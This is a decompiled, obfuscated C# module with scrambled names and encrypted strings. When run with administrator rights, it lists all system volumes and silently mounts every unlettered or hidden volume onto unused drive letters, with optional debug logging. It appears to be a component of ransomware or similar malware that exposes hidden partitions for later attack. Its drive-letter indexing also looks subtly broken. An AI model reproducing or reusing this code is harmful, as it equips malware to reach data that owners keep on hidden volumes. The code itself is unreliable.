using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace jDlAujUelC;

public static class hFBfnpUAtHRB
{
	public enum cEbNHxyCFyxpTm : uint
	{
		dbDyVOlxtCtL,
		roQXugcfKwc,
		BPSnBgvMGDB,
		POfJHLkkVaJ,
		KKdPjMWNCEDSTURGE,
		sjjqzJtbaUfa,
		ZlrndHRxwhOK
	}

	private sealed class esTFFXpoUsd
	{
		public uint RCRaHsMrEaPw;

		public uint dCuerHWenGt;

		public char[] suUJvLEFyvHH;

		public bool _003CMountVolumes_003Eb__0(string string_0)
		{
			if (GetVolumePathNamesForVolumeNameW(string_0, suUJvLEFyvHH, dCuerHWenGt, ref RCRaHsMrEaPw))
			{
				return suUJvLEFyvHH.Length != 3;
			}
			return true;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	public static extern cEbNHxyCFyxpTm GetDriveType([MarshalAs(UnmanagedType.LPStr)] string CtvKdBIpKkcANcHU);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetVolumePathNamesForVolumeNameW(string hWDDyHXKTTsGiz, char[] GjNvPBkpxEje, uint cPbJlhKzEWrIacO, ref uint FIweFsjMuzxYE);

	[DllImport("kernel32.dll")]
	internal static extern bool SetVolumeMountPoint(string string_0, string string_1);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern int FindFirstVolume(StringBuilder stringBuilder_0, int int_0);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern bool FindNextVolume(int int_0, StringBuilder stringBuilder_0, int int_1);

	public static List<string> lvtHmiXMHFlHZa()
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		List<string> list = new List<string>();
		int int_ = FindFirstVolume(stringBuilder, 1024);
		do
		{
			list.Add(stringBuilder.ToString());
			Console.WriteLine(stringBuilder.ToString());
		}
		while (FindNextVolume(int_, stringBuilder, 1024));
		return list;
	}

	public static void mEBSTVfARXeb()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		try
		{
			esTFFXpoUsd CS_0024_003C_003E8__locals0 = new esTFFXpoUsd();
			string[] array = new string[26]
			{
				getString_0(107350165),
				getString_0(107350160),
				getString_0(107350155),
				getString_0(107350118),
				getString_0(107350113),
				getString_0(107350108),
				getString_0(107350135),
				getString_0(107350130),
				getString_0(107350125),
				getString_0(107350088),
				getString_0(107350083),
				getString_0(107350078),
				getString_0(107350105),
				getString_0(107350100),
				getString_0(107350095),
				getString_0(107349546),
				getString_0(107349541),
				getString_0(107349536),
				getString_0(107349531),
				getString_0(107349558),
				getString_0(107349553),
				getString_0(107349548),
				getString_0(107349511),
				getString_0(107349506),
				getString_0(107349501),
				getString_0(107349528)
			};
			string[] array2 = new string[array.Length];
			int num = 0;
			string[] array3 = array;
			foreach (string text in array3)
			{
				if (GetDriveType(text) == cEbNHxyCFyxpTm.roQXugcfKwc)
				{
					array2[num++] = text;
				}
			}
			List<string> source = lvtHmiXMHFlHZa();
			CS_0024_003C_003E8__locals0.RCRaHsMrEaPw = 0u;
			CS_0024_003C_003E8__locals0.dCuerHWenGt = 120u;
			CS_0024_003C_003E8__locals0.suUJvLEFyvHH = new char[260];
			foreach (string item in source.Where((string string_0) => !GetVolumePathNamesForVolumeNameW(string_0, CS_0024_003C_003E8__locals0.suUJvLEFyvHH, CS_0024_003C_003E8__locals0.dCuerHWenGt, ref CS_0024_003C_003E8__locals0.RCRaHsMrEaPw) || CS_0024_003C_003E8__locals0.suUJvLEFyvHH.Length != 3))
			{
				SetVolumeMountPoint(array2[num--], item);
				if (hNCHegfceoe.IebLDrmorstxvf)
				{
					try
					{
						Console.WriteLine(getString_0(107349523), array2[num--]);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (hNCHegfceoe.LbhjvcCDDsZLYlccs)
			{
				try
				{
					File.AppendAllText(hNCHegfceoe.KymHhFbNcwDYA, getString_0(107349498) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static hFBfnpUAtHRB()
	{
		Strings.CreateGetStringDelegate(typeof(hFBfnpUAtHRB));
	}
}
